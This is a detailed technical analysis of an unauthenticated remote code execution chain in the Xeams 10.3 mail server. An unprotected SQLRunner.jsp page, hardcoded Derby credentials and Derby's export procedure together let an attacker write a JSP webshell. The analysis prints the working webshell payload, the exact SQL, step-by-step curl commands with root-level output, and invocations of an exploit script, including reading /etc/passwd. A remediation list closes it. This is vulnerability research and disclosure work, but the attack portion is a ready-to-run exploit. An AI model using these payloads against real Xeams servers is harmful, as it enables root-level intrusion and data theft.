# Xeams SQLRunner.jsp Unauthenticated Derby Hardcoded Cred JSP Webshell RCE - Technical Analysis

## Overview

Xeams 10.3 (build 6449, Synametrics Technologies) is a Java mail server (SMTP/POP3/IMAP + anti-spam + web admin console) shipped with a bundled JRE, a self-developed "Synametrics Web Server v9" (an embedded Tomcat with Jasper for on-demand JSP compilation), and an embedded Derby database listening on `127.0.0.1:7865`. The web admin console is served by a `FrontController` servlet that dispatches `?operation=<op>` requests to a `Ja.java` handler, with a self-developed authorization model (`a5.I` user level: I>=50 super, I>=20 admin, I==10 regular, I==-1 anonymous). However, `web.xml` declares no `security-constraint` at all, the `SynaFilter` filter is mapped only to `/FrontController/*` (not to `*.jsp`), and `NewPageHeader.jsp` (included at the top of most JSPs) does not enforce authentication. The net effect is that directly requesting any `*.jsp` bypasses the `FrontController` dispatch, the `SynaFilter`, and the `Ja.java` operation-level authorization. The built-in `SQLRunner.jsp` administrative page has an `operation=1` branch that performs no authentication check and connects to the embedded Derby database using attacker-supplied credentials; Xeams hardcodes the Derby database-owner credentials `system/manager` in `db/Ea.java`, so an attacker reuses them. With the JDBC connection stored in the HTTP session, `operation=2` issues arbitrary SQL, and calling the Derby procedure `SYSCS_UTIL.SYSCS_EXPORT_QUERY` writes an attacker-controlled JSP webshell into the Tomcat `webapps/ROOT` docBase. A subsequent GET triggers Jasper on-demand compilation and execution, yielding arbitrary command execution at the Xeams process privilege (root in the lab deployment). The chain was dynamically verified end-to-end, producing `uid=0(root)` output.

## Architecture

```
L1 external access: 5272/TCP (Xeams web admin, default); Derby 7865/TCP bound to 127.0.0.1 only
L2 boundary: HTTP (FrontController servlet + embedded Tomcat for *.jsp)
L3 gateway: FrontController servlet dispatches ?operation=<op> to Ja.java handler
L4 auth: a5.I user level (>=50 super / >=20 admin / ==10 regular / ==-1 anonymous); web.xml has NO security-constraint; SynaFilter maps /FrontController/* only; NewPageHeader.jsp does not enforce auth
L5 business: SQLRunner.jsp operation=1 (unauthenticated Derby connect) / operation=2 (arbitrary SQL exec)
L6 storage: embedded Derby DB (localhost:7865) + Tomcat webapps/ROOT docBase (Jasper on-demand compile)
```

**Exploit path**: unauthenticated attacker -> `POST /SQLRunner.jsp?operation=1` (bypasses FrontController/SynaFilter/Ja.java) -> `NewPageHeader.jsp` does not enforce auth -> `operation=1` branch has no auth check -> `DriverManager.getConnection(url, system, manager)` (hardcoded creds from `db/Ea.java`) -> `dbConnHolder` stored in HTTP session -> `POST /SQLRunner.jsp?operation=2` reuses session -> `stmt.execute("CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY(...)")` -> Derby writes JSP webshell to `webapps/ROOT/<name>.jsp` -> `GET /<name>.jsp?c=<cmd>` -> Jasper compiles and executes -> `Runtime.getRuntime().exec(cmd)` -> command output returned in response body.

## Stage 0: Authentication Boundary

The Xeams web admin console architecture has three independent authorization mechanisms, all of which are bypassable by direct `*.jsp` access:

1. **`web.xml`**: declares **no `security-constraint`** at all. There is no container-level authentication or authorization for any URL pattern, including `*.jsp`.
2. **`SynaFilter`** (self-developed servlet filter): mapped only to `/FrontController/*`. It does not cover `*.jsp`, so direct JSP access never passes through the filter.
3. **`NewPageHeader.jsp`** (included at the top of most JSPs, including `SQLRunner.jsp`): does **not enforce authentication**. It only reads `authorizationLevel` from the session for display purposes (e.g., which menu to render); it never redirects an unauthenticated user to a login page.
4. **`Ja.java`** operation-level check: only reached when the request is dispatched through `FrontController` via `?operation=<op>`. Direct `*.jsp` access never reaches `Ja.java`.

The key conclusion: **directly requesting `*.jsp` bypasses `FrontController` dispatch, bypasses `SynaFilter`, and bypasses `Ja.java` operation-level checks**. The `SQLRunner.jsp` `operation=1` branch itself performs **no authentication check**.

## Stage 1: Sink Identification

**Sink 1 - `SYSCS_UTIL.SYSCS_EXPORT_QUERY` (Derby file-write procedure)**

A Derby system procedure that writes the result of an arbitrary query to an arbitrary file path:

```sql
SYSCS_UTIL.SYSCS_EXPORT_QUERY(
  IN SELECTSTATEMENT VARCHAR,
  IN FILENAME VARCHAR,
  IN COLUMNDELIMITER CHAR(1),
  IN CHARACTERDELIMITER CHAR(1),
  IN CODESET VARCHAR)
```

`FILENAME` may be absolute or relative to the Derby process CWD. The Xeams process CWD is the install root, so the relative path `webfront/webapps/ROOT/x.jsp` resolves to the Tomcat docBase.

**Sink 2 - Jasper on-demand compilation**

`h.java:84` `a4.a.addWebapp(a2, a3)` registers `webapps/ROOT` as a webapp, which auto-registers the Jasper `JspServlet` to handle `*.jsp`. A newly written `.jsp` is compiled and executed on first GET.

**Sink 3 - `Runtime.getRuntime().exec`**

The JSP webshell body `<%Runtime.getRuntime().exec(request.getParameter("c"));%>` is arbitrary command execution running inside the Jasper-compiled servlet.

## Stage 2: Source Identification

**Source - `SQLRunner.jsp` `operation=1` branch (unauthenticated)**

`webapps/ROOT/SQLRunner.jsp` key code:

```jsp
<%@ include file="NewPageHeader.jsp" %>   <!-- does not enforce auth -->
...
<%-- line 227-228 --%>
ConnectionHolder dbConnHolder = (ConnectionHolder)session.getAttribute("dbConnHolder");
String operation = request.getParameter("operation");  // defaults to "4"
<%-- line 238: only when dbConnHolder==null AND operation!=1 does it return "Permission denied" --%>
if(dbConnHolder == null && !operation.equals("1")) { ... "Permission denied" ... }
<%-- line 256-268: operation=1 has NO auth check --%>
if(operation.equals("1")) {
    String driverClass = request.getParameter("txtDriverClass");
    String connUrl     = request.getParameter("txtConnUrl");
    String uid         = request.getParameter("txtUID");
    String pwd         = request.getParameter("txtPWD");
    Class.forName(driverClass);
    dbConnHolder = new ConnectionHolder(DriverManager.getConnection(connUrl, uid, pwd));
    session.setAttribute("dbConnHolder", dbConnHolder);  // stored in session
}
<%-- line 287-307: operation=2 only requires dbConnHolder --%>
if(operation.equals("2")) {
    String sqlString = request.getParameter("txtQuery");
    stmt.execute(sqlString);  // arbitrary SQL execution
}
```

The `operation=1` branch connects to any attacker-specified JDBC URL with attacker-specified credentials and stores the resulting connection in the HTTP session. The only "gate" is that `operation` must equal `"1"` to avoid the `Permission denied` early return; there is no check that the caller is authenticated.

**Source - hardcoded Derby credentials**

`com/synametrics/xeams/db/Ea.java` (deobfuscated):

```java
// line 26
a = "org.apache.derby.jdbc.ClientDriver";
// line 58-61  (written into session to pre-fill the SQLRunner form)
manual_dbDriver = "org.apache.derby.jdbc.ClientDriver";
manual_dbUrl    = "jdbc:derby://localhost:7865/xeamsDB;create=true";
manual_dbUser   = "system";
manual_dbPassword = "manager";
// line 81  (Xeams itself connects to Derby with these credentials = real credentials)
k.d(g, "system", "manager", a, 3, 1, "select 'hello' from SYSIBM.SYSDUMMY1");
// line 98-99
D = 7865;  g = "jdbc:derby://localhost:7865/xeamsDB;create=true";
```

`system/manager` are the Derby database-owner credentials (Derby has no authentication by default, but `system` is the DB owner with full privileges, including execution of `SYSCS_UTIL` procedures). Because Xeams itself uses these credentials to connect to its own Derby database, they are real, working credentials hardcoded in the product.

## Stage 3: Data Flow

```
remote attacker (no cookie, no credentials)
   |
   |  POST /SQLRunner.jsp?operation=1
   |  txtDriverClass=org.apache.derby.jdbc.ClientDriver
   |  txtConnUrl=jdbc:derby://localhost:7865/xeamsDB
   |  txtUID=system  txtPWD=manager
   v
SQLRunner.jsp (bypasses FrontController / SynaFilter / Ja.java level checks)
   |  NewPageHeader.jsp does not enforce auth  [OK]
   |  JspValidator only blocks <script>       [payload has no <script>]
   |  operation=1 branch has no auth check     [OK]
   |  DriverManager.getConnection(url, system, manager)
   v
embedded Derby DB (localhost:7865) -- dbConnHolder stored in HTTP session
   |
   |  POST /SQLRunner.jsp?operation=2  (reuse session)
   |  txtQuery=CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY(
   |    'SELECT ''<JSP webshell>'' AS x FROM SYSIBM.SYSDUMMY1',
   |    'webfront/webapps/ROOT/x.jsp', ',', '|', NULL)
   v
Derby executes SYSCS_EXPORT_QUERY -> writes JSP file to webapps/ROOT/x.jsp
   |
   |  GET /x.jsp?c=id
   v
Jasper on-demand compiles x.jsp -> Runtime.exec("id")
   |
   v
command execution output returned in response body = uid=0(root)
```

## Stage 4: Injection / Exploit Construction

**JSP webshell payload** (no `<script` to bypass `JspValidator`; no single quotes to ease SQL string embedding):

```jsp
<%Process p=Runtime.getRuntime().exec(request.getParameter("c"));java.io.InputStream is=p.getInputStream();int b;while((b=is.read())!=-1)out.write(b);%>
```

**SQL construction** (the first argument of `SYSCS_EXPORT_QUERY` is a single-quoted string; inner single quotes are doubled):

```sql
CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY(
  'SELECT ''<%Process p=Runtime.getRuntime().exec(request.getParameter("c"));java.io.InputStream is=p.getInputStream();int b;while((b=is.read())!=-1)out.write(b);%>'' AS x FROM SYSIBM.SYSDUMMY1',
  'webfront/webapps/ROOT/x.jsp',
  ',',
  '|',
  NULL)
```

**Key parameter choices**:

- `columnDelimiter=','` and `characterDelimiter='|'`: the two must differ (otherwise Derby raises "delimiter used more than once"). `|` does not appear in the payload and is not `"`, so the inner `"c"` is not escaped by the character delimiter.
- The written file content becomes `|<%...%>|` (the `|` characters are JSP template text; the scriptlet compiles and executes normally).
- `NULL` codeset uses the default encoding.

**Webshell filename**: a random 6-hex-character name (e.g., `x9e2f.jsp`) is generated per run because `SYSCS_EXPORT_QUERY` fails if the target file already exists.

**Write path**: the relative path `webfront/webapps/ROOT/<name>.jsp` resolves against the Derby process CWD (the Xeams install root). If the relative path fails (CWD is not the install root), the exploit falls back to the common absolute path `/opt/XeamsXeams/webfront/webapps/ROOT/<name>.jsp`.

## Stage 5: Dynamic Verification (Unauthenticated End-to-End)

The chain was verified end-to-end against a lab deployment of Xeams 10.3 build 6449 running as a systemd service (`xeams`) under root, with the web admin port 5272 firewalled to localhost (verification performed over loopback, consistent with the public-exposure constraint).

**Step 1 - unauthenticated Derby connect (`operation=1`)**:

```bash
curl -s -c cookies.txt -o r1.txt -w 'HTTP=%{http_code} size=%{size_download}\n' \
  -X POST 'http://127.0.0.1:5272/SQLRunner.jsp?operation=1' \
  --data-urlencode 'txtDriverClass=org.apache.derby.jdbc.ClientDriver' \
  --data-urlencode 'txtConnUrl=jdbc:derby://localhost:7865/xeamsDB' \
  --data-urlencode 'txtUID=system' --data-urlencode 'txtPWD=manager'
```

Response: `HTTP=200 size=8035`, containing the `Query string:` and `txtQuery` form markers = connection succeeded, query form returned. No SQL Exception, no "Permission denied". A fresh client (empty cookie jar) succeeds identically, confirming no prior authentication is required.

**Step 2 - `SYSCS_EXPORT_QUERY` writes the webshell (`operation=2`)**:

```bash
curl -s -b cookies.txt -o r2.txt -w 'HTTP=%{http_code} size=%{size_download}\n' \
  -X POST 'http://127.0.0.1:5272/SQLRunner.jsp?operation=2' \
  --data-urlencode 'txtQuery@query.txt'
```

Response: `HTTP=200 size=8317`, containing `Success`. The file lands on disk: `-rw-r--r-- 1 root root 155 ... webapps/ROOT/x9e2f.jsp`, with content `|<%Process p=Runtime.getRuntime().exec(request.getParameter("c"));...%>|`.

**Step 3 - trigger RCE**:

```bash
curl -s 'http://127.0.0.1:5272/x9e2f.jsp?c=id'
```

Response (42 bytes):

```
|uid=0(root) gid=0(root) groups=0(root)
|
```

= **root-privilege command execution confirmed**.

**Marker verification via the webshell**:

```bash
curl -s -o /dev/null 'http://127.0.0.1:5272/x9e2f.jsp?c=touch%20/tmp/xeams_unauth_rce_marker'
ls -la /tmp/xeams_unauth_rce_marker   # -rw-r--r-- 1 root root 0  (file created by root)
curl -s 'http://127.0.0.1:5272/x9e2f.jsp?c=whoami'   # |root|
```

## Stage 6: Reachability (Default Config)

- **Remote reachability**: any attacker who can reach the Xeams web port (default 5272/TCP) can exploit the chain. The default deployment binds 5272 to `*` (all interfaces); some deployments firewall it to localhost (as in this lab), but once the port is reachable the chain is exploitable.
- **Default config**: `initialSetupDone=true` (post-initial-setup), `loginCreationDisabled=true`, `csrfFilteringDisabled=0`, `configFlags=0` (SSO off) - none of these affect this chain, which depends on no login, no CSRF, and no SSO.
- **Derby localhost binding**: Derby listens on `127.0.0.1:7865` and is not directly reachable from the network - but **no direct Derby access is required**, because `SQLRunner.jsp operation=1` connects to localhost:7865 from inside the Xeams JVM on the attacker's behalf.
- **JDBC URL injection (additional primitive)**: `txtConnUrl` is fully attacker-controlled and could point to an attacker-controlled database or a malicious LDAP/HTTP URL (potential JNDI), but the local Derby path is the simplest and most reliable.

## Stage 7: Defense in Depth / Remediation

1. **Add authentication for `*.jsp`**: add a `security-constraint` in `web.xml` for `SQLRunner.jsp` and other administrative JSPs, or enforce an authentication redirect in `NewPageHeader.jsp`.
2. **Extend `SynaFilter` to cover `*.jsp`**: force all JSP access through the authentication filter, not only `/FrontController/*`.
3. **Remove or restrict `SQLRunner.jsp`**: remove it from production builds, or restrict it to local access plus strong authentication; it is a database administration tool and should not ship in a production mail server.
4. **Remove hardcoded credentials**: remove the `system/manager` Derby credentials from `db/Ea.java`; generate random credentials at install time and store them in the configuration.
5. **Revoke `SYSCS_UTIL` privileges**: downgrade the application Derby user and revoke execution privileges on `SYSCS_UTIL` procedures so `SYSCS_EXPORT_QUERY` cannot write arbitrary files even if SQL execution is reached.
6. **Make the JSP write directory non-writable**: ensure `webapps/ROOT` is not writable by the Derby process (difficult in practice because Derby runs in the same JVM as Xeams).
7. **Privilege reduction**: do not run Xeams as root; dropping privileges limits the impact of any successful RCE.

## Key Source Index

| File | Line | Content |
|------|------|---------|
| `webapps/ROOT/SQLRunner.jsp` | 256-268 | operation=1 unauthenticated DB connect |
| `webapps/ROOT/SQLRunner.jsp` | 287-307 | operation=2 arbitrary SQL execution |
| `webapps/ROOT/NewPageHeader.jsp` | 20-45 | does not enforce auth; JspValidator only blocks `<script` |
| `webapps/ROOT/WEB-INF/web.xml` | - | no security-constraint; SynaFilter maps /FrontController/* only |
| `db/Ea.java` | 26, 58-61, 81, 98-99 | hardcoded system/manager + Derby URL |
| `h.java` | 84, 207 | addWebapp registers Jasper on-demand compilation |
| `db/w/H.java` | 14, 23 | proves the DB user has SYSCS_UTIL procedure privileges |
| `bean/JspValidator.java` | 28-32 | only blocks `<script` |

## Reproduction Commands

The full pure-stdlib Python exploit script is at `exploit/xeams_unauth_sqlrunner_derby_jsp_rce.py`. Run results were captured end-to-end.

```bash
# Unauthenticated RCE (target = Xeams web base URL, default port 5272)
python3 product/xeams/xeams-10.3/unauth-sqlrunner-derby-jsp-rce/exploit/xeams_unauth_sqlrunner_derby_jsp_rce.py http://127.0.0.1:5272 "id"
python3 product/xeams/xeams-10.3/unauth-sqlrunner-derby-jsp-rce/exploit/xeams_unauth_sqlrunner_derby_jsp_rce.py http://127.0.0.1:5272 "whoami"
python3 product/xeams/xeams-10.3/unauth-sqlrunner-derby-jsp-rce/exploit/xeams_unauth_sqlrunner_derby_jsp_rce.py http://127.0.0.1:5272 "cat /etc/passwd"
```
